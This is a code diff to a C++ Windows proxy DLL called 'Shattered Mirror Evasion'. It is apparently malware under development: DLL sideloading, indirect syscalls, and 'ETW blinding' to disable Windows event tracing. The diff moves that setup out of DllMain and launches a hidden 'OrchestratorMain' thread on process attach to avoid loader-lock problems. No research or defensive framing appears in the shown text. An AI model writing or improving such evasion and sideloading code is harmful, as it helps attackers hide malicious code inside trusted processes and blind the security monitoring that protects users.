@@ -14,18 +14,15 @@
 #include "EvasionSuite.h"
 #include "Logger.h"
 #include "Config.h"
+#include "MasterCatcher.h"
 #include <windows.h>
 #include <winternl.h>
 #include <cstdio>
 #include <string>
 
-// Global DLL Debugger
+// Global DLL Debugger (DEPRECATED: Use ForceLogUniversal instead)
 void DLL_Log(const char* msg) {
-    FILE* f = fopen("C:\\Users\\Public\\shattered_debug.txt", "a");
-    if (f) {
-        fprintf(f, "[%lu] %s\n", GetTickCount(), msg);
-        fclose(f);
-    }
+    ForceLogUniversal(msg);
 }
 
 /* START DYNAMIC EXPORTS */
@@ -139,36 +136,16 @@ static VOID CALLBACK StartupTimerCallback(PVOID lpParameter, BOOLEAN TimerOrWait
 }
 
 /*---------------------------------------------------------------------------
- *  DllMain — Core Execution
- *  Our logic is triggered here, but the functions above handle the proxying.
+ * DllMain — Core Execution
  *-------------------------------------------------------------------------*/
 BOOL WINAPI DllMain(HINSTANCE hInstDll, DWORD dwReason, LPVOID lpReserved) {
     if (dwReason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hInstDll);
-
-        // Initialize internal logging and setup
-        Logger::Init(Config::LOG_FILE_PATH, Config::ENABLE_DEBUG_CONSOLE);
-        DLL_Log("DLL_PROCESS_ATTACH: Initializing Shattered Mirror Evasion...");
-
-        /* 1. Resolve Indirect Syscalls (Must be first) */
-        if (!InitSyscallTable(&g_SyscallTable)) {
-            DLL_Log("[!] FAILED to initialize Syscall Table.");
-        } else {
-            DLL_Log("[+] Syscall Table initialized successfully.");
-            
-            /* 2. Blind ETW Logging using the resolved syscalls */
-            if (BlindETW(&g_SyscallTable)) {
-                DLL_Log("[+] ETW Blinding successful.");
-            }
-        }
-
-        /* 3. Initialize Atom Manager and launch Orchestrator */
-        if (InitAtomManager()) {
-            DLL_Log("[+] Atom Manager ready. Launching Orchestrator thread...");
-            CreateThread(NULL, 0, OrchestratorMain, NULL, 0, NULL);
-        } else {
-            DLL_Log("[!] Atom Manager initialization FAILED.");
-        }
+        /* * DO NOTHING ELSE HERE! No logging, no heavy lifting.
+         * Just spawn the thread to escape the Loader Lock.
+         */
+        InitGodModeLogger(); // Set up the universal logger first
+        CreateThread(NULL, 0, OrchestratorMain, NULL, 0, NULL);
     }
     else if (dwReason == DLL_PROCESS_DETACH) {
         Logger::Shutdown();
